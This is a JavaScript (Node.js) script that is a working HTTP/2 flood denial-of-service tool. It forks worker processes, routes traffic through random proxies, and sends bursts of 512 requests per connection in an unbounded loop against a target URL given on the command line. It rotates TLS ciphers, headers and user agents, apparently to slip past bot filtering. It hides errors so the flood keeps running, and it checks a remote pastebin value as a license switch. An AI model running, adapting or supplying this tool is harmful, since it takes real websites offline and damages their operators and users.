const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  net = require('net'),
  cluster = require('cluster'),
  randstr = require('randomstring'),
  request = require('request'),
  cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
  ],
  accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
  ],
  lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
  ],
  encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
  ],
  controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
  ],
  ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
  ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)];
}

function spoof() {
  return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

function randomByte() {
  return Math.round(Math.random() * 256);
}

function randomIp() {
  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

  return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

async function checkLicense() {

  request('https://pastebin.com/raw/PexApvgD', function(error, response, body) {

    if (error) {
      process.exit(-1);
    };
    if (body === "true") {
      return;
    } else {
      console.log(body);
      process.exit(-1);
    };

  });

};

const target = process.argv[2],
  time = process.argv[3],
  thread = process.argv[4],
  proxies = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g),
  useragents = fs.readFileSync(process.argv[6], 'utf-8').toString().match(/\S+/g);

function useragent() {
  return useragents[Math.floor(Math.random() * useragents.length)]
}

function proxyr() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

if (cluster.isMaster) {
  const dateObj = new Date();

  for (var bb = 0; bb < thread; bb++) {
    cluster.fork();
  }

  setTimeout(() => {

    process.exit(-1)

  }, time * 1000)

} else {

  console.log(`Started.`);

  var parsed = url.parse(target);

  function flood() {

    const agent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 10000,
      maxSockets: 0,
    });

    const ua = useragent();
    var cipper = cipher();
    var proxy = proxyr().split(':');

    var header = {
      "host": parsed.host,
      ":path": parsed.path,
      //"X-Forwarded-For": spoof(),
      ":method": "GET",
      "User-agent": ua,
      "Origin": target,
      "Accept": accept(),
      "Upgrade-Insecure-Requests": "1",
      "Accept-Encoding": encoding(),
      "Accept-Language": lang(),
      "Cache-Control": controling(),
    };

    var req = http.request({
      host: proxy[0],
      agent: agent,
      globalAgent: agent,
      port: proxy[1],
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
      },
      method: 'CONNECT',
      path: parsed.host + ':443'
    }, function() {
      req.setSocketKeepAlive(true);
    });

    req.on('connect', function(res, socket, head) {

      const client = http2.connect(parsed.href, {

        createConnection: () => tls.connect({
          host: parsed.host,
          ciphers: cplist[Math.floor(Math.random() * cplist.length)],
          secureProtocol: 'TLS_method',
          TLS_MAX_VERSION: '1.2',
          port: 80,
          servername: parsed.host,
          maxRedirects: 20,
          curve: "GREASE:X25519:x25519",
          secure: true,
          rejectUnauthorized: false,
          ALPNProtocols: ['h2'],
          sessionTimeout: 5000,
          socket: socket,
          decodeEmails: false,
          gzip: true
        }, function() {
          for (let i = 0; i < 512; i++) {

            const req = client.request(header);
            req.setEncoding('utf8');

            req.on('data', (chunk) => {
              // data += chunk;
            });
            req.on("response", () => {
              req.close();
            })
            req.end();
          }
        })
      });
    });

    req.end();

  }

  setInterval(() => {
    //starting flood ints
    flood()
  }, 0);
}